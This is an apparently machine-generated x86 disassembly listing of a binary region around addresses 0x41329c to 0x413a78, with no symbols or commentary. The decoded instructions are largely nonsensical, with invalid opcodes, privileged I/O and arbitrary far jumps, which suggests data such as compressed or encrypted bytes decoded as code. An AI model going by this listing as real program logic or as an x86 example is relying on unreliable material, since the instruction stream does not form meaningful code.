  41329c:	and    al,0x5
  41329e:	retf   0xb277
  4132a1:	outs   dx,DWORD PTR ds:[esi]
  4132a2:	xchg   esp,eax
  4132a3:	jae    0x413248
  4132a5:	jl     0x41328b
  4132a7:	(bad)  
  4132a8:	cmc    
  4132a9:	sub    bl,ah
  4132ab:	(bad)  
  4132ac:	add    eax,0x513c3968
  4132b1:	pop    ds
  4132b2:	shl    BYTE PTR [ecx-0x50eefc1b],1
  4132b8:	or     DWORD PTR [eax+edx*4],ebx
  4132bb:	mov    edi,0x3030f162
  4132c0:	and    BYTE PTR [edx],ch
  4132c2:	in     al,0xd6
  4132c4:	icebp  
  4132c5:	not    BYTE PTR [ecx]
  4132c7:	dec    esp
  4132c8:	loopne 0x4132cd
  4132ca:	nop
  4132cb:	cmp    esp,DWORD PTR [ecx+0x1f]
  4132ce:	int3   
  4132cf:	mov    cl,0xe5
  4132d1:	add    edx,eax
  4132d3:	cmp    DWORD PTR [ecx-0x687d9be1],esp
  4132d9:	out    0xdc,al
  4132db:	(bad)  
  4132dc:	cdq    
  4132dd:	add    al,0x90
  4132df:	mov    dl,0x6c
  4132e1:	rol    BYTE PTR [eax],1
  4132e3:	add    BYTE PTR [eax],al
  4132e5:	add    BYTE PTR [eax],al
  4132e7:	add    eax,0xff480167
  4132ec:	das    
  4132ed:	in     eax,0x4c
  4132ef:	cmc    
  4132f0:	add    WORD PTR [eax-0x11],cx
  4132f4:	das    
  4132f5:	in     eax,0xe4
  4132f7:	sbb    al,0xd7
  4132f9:	sub    DWORD PTR [ebx],eax
  4132fb:	nop
  4132fc:	mov    dl,0x16
  4132fe:	jns    0x4132c9
  413300:	sbb    cl,BYTE PTR [esi]
  413302:	cld    
  413303:	mov    bl,0x2d
  413305:	out    dx,eax
  413306:	and    al,BYTE PTR [edi-0xe]
  413309:	(bad)  
  41330a:	imul   esi,DWORD PTR [ebp-0x4a],0xe
  41330e:	jmp    0x296b714b
  413313:	xchg   ebx,eax
  413314:	mov    dl,0xe
  413316:	bound  edx,QWORD PTR [eax-0x2a]
  413319:	cmp    al,dl
  41331b:	push   edi
  41331c:	(bad)  
  41331d:	sbb    bh,dl
  41331f:	out    dx,al
  413320:	pop    ss
  413321:	inc    edi
  413322:	out    0x93,al
  413324:	mov    dl,0x8b
  413326:	out    dx,al
  413327:	out    dx,eax
  413328:	mov    dl,0x83
  41332a:	jne    0x4132dc
  41332c:	jb     0x41333b
  41332e:	jmp    0x12c5d9c6
  413333:	pop    ebx
  413334:	test   al,0x88
  413336:	sbb    cl,BYTE PTR [edx+esi*2-0x7b]
  41333a:	scas   al,BYTE PTR es:[edi]
  41333b:	xlat   BYTE PTR ds:[ebx]
  41333c:	out    0x47,eax
  41333e:	mov    ebp,0x47e93e5c
  413343:	xor    eax,0x2cbbe52d
  413348:	sub    eax,0x72ef
  41334d:	add    BYTE PTR [eax],al
  41334f:	add    BYTE PTR [eax-0x2a],bh
  413352:	cs jb  0x4133ca
  413355:	sahf   
  413356:	and    esp,DWORD PTR [ebx]
  413358:	mov    ecx,esi
  41335a:	xor    ah,BYTE PTR [ecx]
  41335c:	mov    dh,0xb3
  41335e:	and    DWORD PTR [esi-0x1538e639],0x4a
  413365:	pop    ss
  413366:	pop    esi
  413367:	div    ah
  413369:	sub    al,0x83
  41336b:	popf   
  41336c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41336d:	shl    bl,cl
  41336f:	sub    ch,BYTE PTR [ecx+0x275a628d]
  413375:	mov    ebp,0x2a10eab8
  41337a:	add    DWORD PTR [ebx+eax*4+0x71],edx
  41337e:	xor    eax,DWORD PTR [eax]
  413380:	mov    dh,0x8a
  413382:	add    DWORD PTR [ebx-0xeea26],eax
  413388:	cmp    edx,ebx
  41338a:	add    al,0x75
  41338c:	(bad)
  413390:	icebp  
  413391:	sub    BYTE PTR [ebx+0x1e],bh
  413394:	mov    al,0x9d
  413396:	outs   dx,BYTE PTR ds:[esi]
  413397:	(bad)  
  413399:	mov    ch,0xf1
  41339b:	call   DWORD PTR [esi]
  41339d:	xor    dh,dh
  41339f:	or     ebx,DWORD PTR [ebp-0x5a07723e]
  4133a5:	sahf   
  4133a6:	add    eax,0xeb1fc3d
  4133ab:	add    BYTE PTR [esi-0x53],ah
  4133ae:	pop    es
  4133af:	push   esi
  4133b1:	push   ss
  4133b2:	dec    ebp
  4133b3:	inc    edx
  4133b4:	add    BYTE PTR [eax],al
  4133b6:	add    BYTE PTR [eax],al
  4133b8:	add    BYTE PTR [edx-0x2f468dff],dh
  4133be:	pop    ss
  4133bf:	lock call esi
  4133c2:	stos   BYTE PTR es:[edi],al
  4133c3:	inc    edx
  4133c4:	and    al,0x89
  4133c6:	or     esp,DWORD PTR ds:0x185f63b
  4133cc:	and    DWORD PTR [esi],0x17
  4133cf:	icebp  
  4133d0:	jmp    DWORD PTR [esi+0x60]
  4133d3:	or     eax,0x2287183
  4133d8:	test   BYTE PTR [edx-0x45000ee9],cl
  4133de:	sbb    DWORD PTR [esi],ebp
  4133e0:	shrd   ebx,edi,cl
  4133e3:	out    dx,eax
  4133e4:	call   DWORD PTR [esi+0x2900aed4]
  4133ea:	mov    dl,0x1
  4133ec:	test   BYTE PTR [esi+0x3afff117],dh
  4133f2:	je     0x413429
  4133f4:	shl    DWORD PTR [ebp+0x67],1
  4133f7:	out    0xc4,eax
  4133f9:	xlat   BYTE PTR ds:[ebx]
  4133fa:	adc    ecx,esi
  4133fc:	mov    edx,DWORD PTR [eax-0x4dfd929]
  413402:	mov    eax,0x246c5d0f
  413407:	mov    BYTE PTR [ebx],ah
  413409:	xlat   BYTE PTR ds:[ebx]
  41340a:	ins    BYTE PTR es:[edi],dx
  41340b:	jmp    0x41341a
  41340d:	push   es
  41340e:	sbb    DWORD PTR [eax-0x5186608],ecx
  413414:	cmp    BYTE PTR [eax+0x750956fb],0x7b
  41341b:	or     al,BYTE PTR [eax]
  41341d:	add    BYTE PTR [eax],al
  41341f:	add    BYTE PTR [eax],al
  413421:	add    BYTE PTR [eax-0x596479ec],dl
  413427:	cmp    al,0xeb
  413429:	inc    ecx
  41342a:	push   edx
  41342b:	lock mov ecx,0x7842b97c
  413431:	dec    BYTE PTR [edi-0x53b3805c]
  413437:	sti    
  413438:	fistp  QWORD PTR [ebx]
  41343a:	mov    ebx,0x130d5ef4
  41343f:	mov    ah,ch
  413441:	std    
  413442:	outs   dx,DWORD PTR ds:[esi]
  413443:	adc    al,0x95
  413445:	add    DWORD PTR [ebx],edx
  413447:	add    DWORD PTR [eax],0xd
  41344a:	adc    al,0x6c
  41344c:	in     eax,dx
  41344d:	std    
  41344e:	push   edi
  41344f:	cwde   
  413450:	ror    BYTE PTR [ecx],cl
  413452:	lahf   
  413453:	lahf   
  413454:	jl     0x413454
  413456:	inc    edi
  413457:	fadd   QWORD PTR [edi-0x78db7308]
  41345d:	arpl   WORD PTR [esi],si
  41345f:	int3   
  413460:	jmp    0x4133e3
  413462:	sub    BYTE PTR [esi],dl
  413464:	sbb    al,0x84
  413466:	les    edi,FWORD PTR [ebp-0x61a20215]
  41346c:	or     al,BYTE PTR [eax]
  41346e:	nop
  41346f:	sbb    al,0x87
  413471:	dec    edi
  413472:	push   cs
  413473:	and    al,0xec
  413475:	inc    ecx
  413476:	push   edx
  413477:	pusha  
  413478:	mov    edx,0xdeb23f7c
  41347d:	dec    ecx
  41347e:	imul   BYTE PTR [eax+edx*8]
  413481:	mov    ds,WORD PTR [esi+edx*8+0x5]
  413485:	out    dx,eax
  413486:	add    BYTE PTR [eax],al
  413488:	add    BYTE PTR [eax],al
  41348a:	add    BYTE PTR [ebx-0x728fdf17],bh
  413490:	xor    DWORD PTR [eax-0x1fd32a1f],eax
  413496:	cdq    
  413497:	xchg   ecx,eax
  413498:	xor    DWORD PTR [ebp+0x64c83c0d],edi
  41349e:	fisttp DWORD PTR [ecx-0x47790d5a]
  4134a4:	mov    ebp,0x2a10f419
  4134a9:	jmp    0x9003:0x6aef9957
  4134b0:	mov    dl,0xf8
  4134b2:	mov    BYTE PTR [ebx-0x2e1d8fd4],al
  4134b8:	jo     0x413476
  4134ba:	mov    ah,0x4
  4134bc:	cld    
  4134bd:	lea    ecx,ds:0x1e682c7e
  4134c3:	aad    0x9e
  4134c5:	loopne 0x41344d
  4134c7:	jmp    FWORD PTR [eax+ebx*2]
  4134ca:	loop   0x413461
  4134cc:	fs in  al,dx
  4134ce:	mov    ss,ebp
  4134d0:	out    0x2f,al
  4134d2:	pop    es
  4134d3:	push   edi
  4134d4:	mov    al,0xe0
  4134d6:	mov    BYTE PTR [edi],bh
  4134d8:	cs cmp dl,ah
  4134db:	shl    DWORD PTR [eax-0x4],1
  4134de:	aaa    
  4134df:	je     0x4134b3
  4134e1:	test   eax,0x12172fc2
  4134e6:	loop   0x413515
  4134e8:	call   0x2fd6a4a5
  4134ed:	lods   al,BYTE PTR ds:[esi]
  4134ee:	loope  0x4134f0
  4134f0:	add    BYTE PTR [eax],al
  4134f2:	add    BYTE PTR [eax],al
  4134f4:	sbb    eax,0x8999f82c
  4134f9:	aaa    
  4134fa:	test   al,0x17
  4134fc:	push   es
  4134fd:	mov    bh,0xe
  4134ff:	call   0x22cbf293
  413504:	lock sub eax,0xe94e2aef
  41350a:	pop    edx
  41350b:	add    eax,0xc0cfaeb4
  413510:	xor    ch,BYTE PTR [eax]
  413512:	out    dx,eax
  413513:	into   
  413514:	jge    0x4134a3
  413516:	(bad)  
  413517:	test   BYTE PTR [eax+edx*8],0xf0
  41351b:	mov    esi,0xe2b8bdb1
  413520:	adc    al,0x76
  413522:	cmp    dh,BYTE PTR [edi-0x9f1d478]
  413528:	push   cs
  413529:	push   eax
  41352a:	icebp  
  41352b:	sahf   
  41352c:	mov    cl,0x71
  41352e:	dec    esp
  41352f:	rcr    BYTE PTR [edi-0x2a],cl
  413532:	cs or  eax,0x849613d1
  413538:	mov    cl,0x2d
  41353a:	xor    ebx,DWORD PTR [esi]
  41353c:	add    BYTE PTR [esi+0x2d67768b],bh
  413542:	out    dx,eax
  413543:	ficomp WORD PTR [ecx]
  413545:	mov    ecx,0x249fae83
  41354a:	or     ch,al
  41354c:	xchg   edx,eax
  41354d:	mov    ebp,0x2d46d68a
  413552:	out    dx,eax
  413553:	stos   BYTE PTR es:[edi],al
  413554:	aad    0xe9
  413556:	pop    edx
  413557:	or     eax,0x0
  41355c:	add    BYTE PTR [esi+ebp*4+0x27e650cf],ch
  413563:	out    dx,eax
  413564:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  413566:	lea    esp,[edx-0x22]
  413569:	adc    al,0x3
  41356b:	icebp  
  41356c:	xor    DWORD PTR es:[ebp+0x751cf2b8],edi
  413573:	cmp    bl,BYTE PTR [edi]
  413575:	cwde   
  413576:	sub    edi,edi
  413578:	fst    QWORD PTR [esi]
  41357a:	xor    ecx,0x0
  41357d:	mov    ss,WORD PTR [ecx]
  41357f:	dec    ebp
  413580:	inc    edx
  413581:	shl    dl,cl
  413583:	sub    ah,BYTE PTR [eax]
  413585:	jge    0x413579
  413587:	out    0x4c,al
  413589:	in     al,dx
  41358a:	adc    ecx,esi
  41358c:	cmp    ecx,DWORD PTR [esi-0x5e]
  41358f:	jge    0x4135ae
  413591:	dec    BYTE PTR [eax+0x5]
  413594:	mov    esi,DWORD PTR [esi-0x17fb0736]
  41359a:	push   ds
  41359b:	add    al,BYTE PTR [esi+edx*8+0x7afff10b]
  4135a2:	je     0x4135d9
  4135a4:	push   esp
  4135a5:	xchg   ebp,eax
  4135a6:	(bad)  
  4135a7:	jb     0x41358c
  4135a9:	rcr    ah,1
  4135ab:	repz (bad) 
  4135ad:	out    dx,al
  4135ae:	xor    eax,0xc1b97c71
  4135b3:	mov    ah,BYTE PTR [eax]
  4135b5:	cld    
  4135b6:	adc    ecx,esi
  4135b8:	mov    edi,DWORD PTR ds:0xa9014ed3
  4135be:	scas   al,BYTE PTR es:[edi]
  4135bf:	out    0x91,eax
  4135c1:	add    BYTE PTR [eax],al
  4135c3:	add    BYTE PTR [eax],al
  4135c5:	add    BYTE PTR [ebx+edx*1],cl
  4135c8:	icebp  
  4135c9:	vmptrst QWORD PTR [eax+0xa]
  4135cd:	vmptrld QWORD PTR [eax+0xb]
  4135d1:	and    DWORD PTR [esi+ebp*4+0x4c7e08e5],0x43
  4135d9:	add    DWORD PTR [esi+0x4c],ebp
  4135dc:	dec    ebx
  4135dd:	add    ch,BYTE PTR [eax-0x5ef4f9ec]
  4135e3:	scas   al,BYTE PTR es:[edi]
  4135e4:	out    0x80,eax
  4135e6:	or     al,0xb6
  4135e8:	pop    edx
  4135e9:	je     0x4135bd
  4135eb:	cs retf 
  4135ed:	add    ebp,DWORD PTR [edx+0xa142a89]
  4135f3:	cmp    eax,0xc32d2462
  4135f8:	mov    al,BYTE PTR [esi+0xb1a90]
  4135fe:	or     DWORD PTR [eax+0x1b915827],eax
  413604:	or     esp,edi
  413606:	ins    DWORD PTR es:[edi],dx
  413607:	sbb    cl,BYTE PTR [ebx]
  413609:	add    BYTE PTR [edx+0x1d],bh
  41360c:	xor    edx,DWORD PTR [eax-0x1]
  41360f:	fbld   TBYTE PTR [edi]
  413611:	pop    esp
  413612:	xchg   ecx,eax
  413613:	sbb    ecx,DWORD PTR [ebx]
  413615:	mov    ebx,ebx
  413617:	or     BYTE PTR [esi+0xb1a4424],dl
  41361d:	add    BYTE PTR [edi-0x8],al
  413620:	xchg   ebp,eax
  413621:	and    al,0x34
  413623:	sbb    cl,BYTE PTR [ebx]
  413625:	add    bh,cl
  413627:	lahf   
  413628:	es pop esp
  41362a:	add    BYTE PTR [eax],al
  41362c:	add    BYTE PTR [eax],al
  41362e:	add    BYTE PTR [ecx+0xb520b1b],dl
  413634:	shl    BYTE PTR [esi],0x34
  413637:	test   al,0xfe
  413639:	int    0xfd
  41363b:	scas   eax,DWORD PTR es:[edi]
  41363c:	mov    cs,edx
  41363e:	or     eax,0xa040d
  413643:	nop
  413644:	xchg   esp,eax
  413645:	jle    0x41366b
  413647:	fs inc edx
  413649:	mov    esi,esp
  41364b:	(bad)
  41364f:	cmp    al,0xf7
  413651:	cs (bad) 
  413653:	jg     0x413670
  413655:	test   cl,cl
  413657:	ja     0x413660
  413659:	daa    
  41365a:	inc    esp
  41365b:	(bad)  
  41365c:	mov    BYTE PTR [esi+0xb1ac424],dl
  413662:	add    BYTE PTR [edi+0x3f],bl
  413665:	es pop esp
  413667:	xchg   ecx,eax
  413668:	sbb    ecx,DWORD PTR [ebx]
  41366a:	std    
  41366b:	add    al,0xaf
  41366d:	dec    esi
  41366e:	inc    DWORD PTR [edi+0x1b]
  413671:	jecxz  0x413664
  413673:	pop    esp
  413674:	fmul   st,st(7)
  413676:	adc    DWORD PTR [eax-0x4e],0xfffffff8
  41367a:	mov    BYTE PTR [esi],ch
  41367c:	mov    dl,0xe5
  41367e:	add    edx,DWORD PTR [ecx]
  413680:	out    dx,eax
  413681:	jecxz  0x41366f
  413683:	enter  0x10,0xdf
  413687:	test   DWORD PTR [eax-0x46],esp
  41368a:	add    bl,BYTE PTR [ebp+0x4707aa60]
  413690:	adc    ebp,ebp
  413692:	or     al,BYTE PTR [eax]
  413694:	add    BYTE PTR [eax],al
  413696:	add    BYTE PTR [eax],al
  413698:	enter  0x913a,0x27
  41369c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41369d:	aaa    
  41369e:	loope  0x4136ac
  4136a0:	test   eax,0x140ef971
  4136a5:	mov    ah,0xed
  4136a7:	add    edx,DWORD PTR [eax+0x38278935]
  4136ad:	mov    bl,0xe5
  4136af:	add    edx,DWORD PTR [eax-0x38af8847]
  4136b5:	xor    edi,DWORD PTR [ebx+0x93e0964]
  4136bb:	cmp    al,0xb7
  4136bd:	sub    ch,ah
  4136bf:	imul   edx,DWORD PTR [edx-0x3faf1f76],0x92484fb8
  4136c9:	repz test DWORD PTR [ebx],ecx
  4136cc:	mov    edx,edi
  4136ce:	jge    0x413747
  4136d0:	mov    ah,0x8a
  4136d2:	out    0x3,al
  4136d4:	nop
  4136d5:	xor    bh,BYTE PTR [ecx-0x20621bd4]
  4136db:	mov    cl,BYTE PTR [edi+ecx*8]
  4136de:	leave  
  4136df:	add    al,0x90
  4136e1:	mov    dl,0xa5
  4136e3:	mov    esp,cs
  4136e5:	into   
  4136e6:	icebp  
  4136e7:	xor    ecx,DWORD PTR [ebp-0x3dfc55a0]
  4136ed:	daa    
  4136ee:	jno    0x413717
  4136f0:	in     al,dx
  4136f1:	mov    cl,0xe5
  4136f3:	add    edx,DWORD PTR [ebp+0x73590e60]
  4136f9:	xchg   esi,eax
  4136fa:	dec    esi
  4136fb:	jmp    0x413700
  413700:	add    BYTE PTR [esi+0x5f],dl
  413703:	sub    al,ch
  413705:	xchg   esp,eax
  413706:	mov    dl,0xe
  413708:	jmp    0x8677:0x5def7de8
  41370f:	or     eax,0xc33993e9
  413714:	push   es
  413715:	daa    
  413716:	iret   
  413717:	push   edx
  413718:	call   0x3e30e9b0
  41371d:	mov    bh,0x86
  41371f:	or     eax,0x401a93e9
  413724:	(bad)
  413727:	mov    DWORD PTR [ecx-0x8ce52b8],ebp
  41372d:	mov    edi,0x9e54ef25
  413732:	mov    ch,0xb8
  413734:	xor    al,0x93
  413736:	mov    ch,0xb8
  413738:	and    al,0x92
  41373a:	cmp    DWORD PTR [edx-0x10d883f3],ebx
  413740:	jmp    0xf2473f17
  413745:	(bad)  [ecx+0x7bfdeee5]
  41374b:	or     eax,0xc7405e6
  413750:	test   al,0xb3
  413752:	mov    edx,0x6e19b103
  413757:	sub    dl,ch
  413759:	adc    esp,esi
  41375b:	and    eax,0x8938d81d
  413760:	fwait
  413761:	test   DWORD PTR [ebx],esi
  413763:	pop    eax
  413764:	icebp  
  413765:	add    BYTE PTR [eax],al
  413767:	add    BYTE PTR [eax],al
  413769:	add    BYTE PTR [ebx-0x3069004e],dl
  41376f:	mov    dl,0xff
  413771:	sahf   
  413772:	adc    al,0xd2
  413774:	bound  ebp,QWORD PTR [ecx+0xe6b193]
  41377a:	shl    BYTE PTR [edx-0x523de3d6],0x35
  413781:	inc    edi
  413782:	sub    eax,0x85288cb6
  413787:	add    eax,0x993efff1
  41378c:	neg    BYTE PTR [eax-0x1a]
  41378f:	in     al,0x53
  413791:	pop    ebx
  413792:	test   al,0xfa
  413794:	and    DWORD PTR [ecx],eax
  413796:	sub    DWORD PTR [ebx+0x39f920cc],esi
  41379c:	mov    ah,BYTE PTR [eiz*1+0x29000eb4]
  4137a3:	jecxz  0x413809
  4137a5:	add    ah,BYTE PTR [ecx]
  4137a7:	jecxz  0x41379a
  4137a9:	mov    ah,0x9d
  4137ab:	jb     0x41379c
  4137ad:	(bad)  
  4137ae:	stc    
  4137af:	cmp    ebx,ebx
  4137b1:	(bad)  
  4137b2:	std    
  4137b3:	into   
  4137b4:	push   edx
  4137b5:	add    ecx,ebp
  4137b7:	mov    dl,0x59
  4137b9:	dec    DWORD PTR [ebp-0x31]
  4137bc:	push   edx
  4137bd:	add    DWORD PTR [ecx+0x6cb85b2],edi
  4137c3:	aas    
  4137c4:	sub    bl,BYTE PTR [eax+ebp*4-0x4e]
  4137c8:	push   cs
  4137c9:	dec    DWORD PTR [ebp-0x31]
  4137cc:	push   edx
  4137cd:	add    DWORD PTR [eax],eax
  4137cf:	add    BYTE PTR [eax],al
  4137d1:	add    BYTE PTR [eax],al
  4137d3:	mov    ecx,0xe2a6e6b2
  4137d8:	add    eax,0xca3eebf1
  4137dd:	xlat   BYTE PTR ds:[ebx]
  4137de:	jne    0x413856
  4137e0:	leave  
  4137e1:	jns    0x413837
  4137e3:	jbe    0x413812
  4137e5:	lds    eax,FWORD PTR [edi]
  4137e7:	imul   esi,DWORD PTR [edx-0x755e88c9],0x39fe8aff
  4137f1:	push   cs
  4137f2:	add    BYTE PTR [ecx-0x4d],bh
  4137f5:	dec    ecx
  4137f6:	push   0xdc2c090
  4137fb:	or     al,0x3f
  4137fd:	or     al,BYTE PTR [eax]
  4137ff:	nop
  413800:	mov    al,ds:0x1ad82487
  413805:	or     eax,DWORD PTR [eax]
  413807:	or     DWORD PTR [ebp+0x1b90008b],edx
  41380d:	xchg   BYTE PTR [esp+esi*2-0x6ffff3a9],al
  413814:	mov    ds:0x1b909c8a,al
  413819:	or     ebp,DWORD PTR [edx-0x6f]
  41381c:	xchg   edx,eax
  41381d:	inc    edx
  41381e:	jo     0x413835
  413820:	retf   0x1793
  413823:	add    al,0x25
  413825:	rcl    DWORD PTR [edi+0x9],cl
  413828:	cmp    eax,0xda4c0d57
  41382d:	in     al,0x62
  41382f:	out    dx,eax
  413830:	or     al,0xd3
  413832:	mov    ecx,edx
  413834:	add    ch,BYTE PTR [edi]
  413836:	std    
  413837:	add    BYTE PTR [eax],al
  413839:	add    BYTE PTR [eax],al
  41383b:	add    bh,bl
  41383d:	cld    
  41383e:	jle    0x4137c4
  413840:	lods   al,BYTE PTR ds:[esi]
  413841:	xlat   BYTE PTR ds:[ebx]
  413842:	or     DWORD PTR [eax],eax
  413844:	nop
  413845:	fstp   TBYTE PTR [edx]
  413847:	push   edx
  413848:	(bad)  
  413849:	lahf   
  41384a:	cs pop esp
  41384c:	xchg   ecx,eax
  41384d:	sbb    ecx,DWORD PTR [ebx]
  41384f:	mov    DWORD PTR [edi+ebp*4-0xa],ebx
  413853:	cld    
  413854:	and    al,0xf7
  413856:	cs out 0x2f,eax
  413859:	inc    esp
  41385a:	sar    ebp,cl
  41385c:	or     ebx,DWORD PTR [eax+0x1b91482e]
  413862:	or     eax,DWORD PTR [edi+0xa9b17]
  413868:	nop
  413869:	mov    al,ds:0x1ad0248e
  41386e:	or     eax,DWORD PTR [eax]
  413870:	or     DWORD PTR [esi+ebx*2-0x2a4d2879],esi
  413877:	in     al,dx
  413878:	sbb    DWORD PTR [esi+0x6e0903e5],esi
  41387e:	add    esp,esi
  413880:	sahf   
  413881:	outs   dx,BYTE PTR ds:[esi]
  413882:	or     DWORD PTR [ebx*4-0x6ff1e8c9],ebp
  413889:	mov    dl,0x30
  41388b:	nop
  41388c:	je     0x413810
  41388e:	out    0x3,al
  413890:	nop
  413891:	cmp    DWORD PTR [ecx+0x287d8c1f],edx
  413897:	push   eax
  413898:	ins    BYTE PTR es:[edi],dx
  413899:	(bad)  
  41389a:	jl     0x413853
  41389c:	sub    BYTE PTR [esi],ch
  41389e:	cmp    ebx,ebx
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	add    BYTE PTR [eax],al
  4138a4:	add    BYTE PTR ds:0x140b252f,dl
  4138aa:	mov    al,0xe6
  4138ac:	add    edx,DWORD PTR [eax-0x4be06e4f]
  4138b2:	cmp    DWORD PTR [ecx+0x20],esp
  4138b5:	push   esp
  4138b6:	mov    bl,0xe5
  4138b8:	add    ebp,ebp
  4138ba:	ins    DWORD PTR es:[edi],dx
  4138bb:	add    DWORD PTR [eax+edx*2],ebp
  4138be:	xor    BYTE PTR [edi],0xdb
  4138c1:	and    al,0xce
  4138c3:	cmp    DWORD PTR ds:0xb06cb290,eax
  4138c9:	int    0x5d
  4138cb:	add    DWORD PTR [eax],edi
  4138cd:	(bad)  
  4138ce:	and    al,0xe5
  4138d0:	mov    cs,ecx
  4138d2:	jl     0x41388c
  4138d4:	(bad)  
  4138d5:	ins    BYTE PTR es:[edi],dx
  4138d6:	xchg   dh,ah
  4138d8:	add    edx,DWORD PTR [eax+0x441f5125]
  4138de:	mov    bl,0xe5
  4138e0:	add    ebx,DWORD PTR [ebp-0x68c83ea3]
  4138e6:	and    al,0xe5
  4138e8:	jmp    0x413917
  4138ea:	or     DWORD PTR [eax-0x70cec26],ecx
  4138f0:	jae    0x413969
  4138f2:	pop    edx
  4138f3:	push   cs
  4138f4:	ja     0x413950
  4138f6:	test   DWORD PTR es:0x3133beb0,ecx
  4138fd:	enter  0xef86,0x95
  413901:	jg     0x413885
  413903:	or     eax,0x423993e9
  413908:	add    eax,0x0
  41390d:	add    BYTE PTR [eax+0x7f],cl
  413910:	pop    esp
  413911:	jb     0x413911
  413913:	sbb    dl,BYTE PTR [esi]
  413915:	and    ebx,DWORD PTR [edx+0x26]
  413918:	mov    DWORD PTR [ecx],ebp
  41391a:	(bad)  
  41391b:	mov    ebp,0xce8f9583
  413920:	sub    DWORD PTR [ebp+0x430bda87],0xffffffd3
  413927:	sub    ecx,DWORD PTR [edx-0x33]
  41392a:	imul   ebp,ecx,0x4a
  41392d:	lds    eax,FWORD PTR [ebx]
  41392f:	test   al,0xdb
  413931:	adc    ch,BYTE PTR [esi-0x6c8290cf]
  413937:	sahf   
  413938:	adc    DWORD PTR [edx-0x2e836946],esi
  41393e:	mov    es,WORD PTR [esi+0x2a]
  413941:	sub    DWORD PTR [ebx-0x76a8f14e],edx
  413947:	loope  0x413917
  413949:	sub    DWORD PTR [ebx],ecx
  41394b:	outs   dx,BYTE PTR ds:[esi]
  41394c:	push   edx
  41394d:	adc    BYTE PTR [ecx-0x5a],dl
  413950:	push   DWORD PTR [ebp+0x75]
  413953:	or     ebp,edi
  413955:	mov    esi,0xdd2a869d
  41395a:	mov    BYTE PTR [eax],dh
  41395c:	imul   esp,eax,0xffffff93
  41395f:	mov    dl,0x83
  413961:	ins    DWORD PTR es:[edi],dx
  413962:	jo     0x4138ea
  413964:	or     eax,0x857293e9
  413969:	sub    eax,0x375ede70
  41396e:	imul   ebx,DWORD PTR [esi+0x2a],0x0
  413975:	add    BYTE PTR [eax],al
  413977:	lods   eax,DWORD PTR ds:[esi]
  413978:	scas   eax,DWORD PTR es:[edi]
  413979:	push   cs
  41397a:	add    BYTE PTR [edx],al
  41397c:	push   esp
  41397d:	icebp  
  41397e:	mov    ah,0x45
  413980:	fucomi st,st(7)
  413982:	(bad)  
  413983:	jns    0x4139bb
  413985:	lds    edx,FWORD PTR [edi-0x12]
  413988:	inc    edx
  413989:	sub    bl,BYTE PTR [eax+ebp*2-0x51]
  41398d:	push   cs
  41398e:	push   ebp
  413990:	rcl    DWORD PTR [edx+0x1],1
  413993:	cmp    DWORD PTR [edi-0x156a4b0f],ebp
  413999:	out    dx,eax
  41399a:	jmp    FWORD PTR [ecx]
  41399c:	pop    ss
  41399d:	stc    
  41399e:	fnstcw WORD PTR [esi+0x9]
  4139a1:	mov    eax,eax
  4139a3:	dec    esi
  4139a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a5:	or     al,0xfe
  4139a7:	outs   dx,BYTE PTR ds:[esi]
  4139a8:	or     DWORD PTR ds:0x85c3555c,esp
  4139ae:	inc    esp
  4139af:	inc    ebp
  4139b0:	mov    bl,0x35
  4139b2:	pop    esp
  4139b3:	aad    0x12
  4139b5:	jle    0x413972
  4139b7:	mov    al,ds:0xe90007ab
  4139bc:	sub    eax,0xb9e97c71
  4139c1:	mov    al,BYTE PTR [ebx]
  4139c3:	lock scas al,BYTE PTR es:[edi]
  4139c5:	push   cs
  4139c6:	cmp    ecx,DWORD PTR [esi-0x66]
  4139c9:	add    DWORD PTR [edx+0xeb6f3],eax
  4139cf:	sub    BYTE PTR [edx-0x5147bfd6],0xe
  4139d6:	jmp    0x3250e1
  4139db:	add    BYTE PTR [eax],al
  4139dd:	add    BYTE PTR [eax],al
  4139df:	add    BYTE PTR [edx],ch
  4139e1:	mov    dh,BYTE PTR [edx+0x0]
  4139e4:	scas   al,BYTE PTR es:[edi]
  4139e5:	mov    ds:0xaeb908ea,al
  4139ea:	in     eax,0xe8
  4139ec:	and    ah,bl
  4139ee:	sub    ch,BYTE PTR [eax]
  4139f0:	mov    al,0xe2
  4139f2:	sub    dl,BYTE PTR [eax]
  4139f4:	nop
  4139f5:	or     al,0x88
  4139f7:	aam    0x98
  4139f9:	or     ecx,DWORD PTR [ebx]
  4139fb:	cmp    edi,esp
  4139fd:	(bad)  
  4139fe:	pop    ecx
  4139ff:	fisttp WORD PTR [edi+0x5030fae9]
  413a05:	xchg   ebp,eax
  413a06:	rol    DWORD PTR [ecx-0x2eb4e68f],0x70
  413a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a0e:	inc    edi
  413a0f:	and    al,0x78
  413a11:	retf   0x1e1
  413a14:	ror    DWORD PTR [edi-0x6860f611],cl
  413a1a:	pushf  
  413a1b:	or     BYTE PTR [eax+0x7484820b],dl
  413a21:	aas    
  413a22:	or     al,0x0
  413a24:	nop
  413a25:	call   0x4bc15e59
  413a2a:	cmp    edx,DWORD PTR [esi+0x27]
  413a2d:	or     BYTE PTR [edi],0x5c
  413a30:	xchg   ecx,eax
  413a31:	or     ecx,DWORD PTR [ebx]
  413a33:	mov    DWORD PTR ds:0x6c247fc9,edi
  413a39:	or     cl,BYTE PTR [ebx]
  413a3b:	add    BYTE PTR [ebx],bl
  413a3d:	in     eax,0x3e
  413a3f:	std    
  413a40:	inc    esp
  413a41:	clc    
  413a42:	inc    DWORD PTR ss:[eax]
  413a45:	add    BYTE PTR [eax],al
  413a47:	add    BYTE PTR [eax],al
  413a49:	test   DWORD PTR [ebx],0x2fb4b4d6
  413a4f:	or     al,0x0
  413a51:	nop
  413a52:	sbb    BYTE PTR [esi+0xb0a3c24],bl
  413a58:	add    al,ch
  413a5a:	into   
  413a5b:	mov    cl,0xfd
  413a5d:	iret   
  413a5e:	xchg   esi,eax
  413a5f:	retf   0x2074
  413a62:	add    eax,DWORD PTR [edi-0x5]
  413a65:	mov    edi,0x6c5c8160
  413a6a:	call   DWORD PTR [ebx]
  413a6c:	enter  0xc32d,0x13
  413a70:	pop    ebp
  413a71:	xor    al,0xb2
  413a73:	adc    al,0x2b
  413a75:	lea    ebp,[eax-0xc]
  413a78:	adc    dl,al
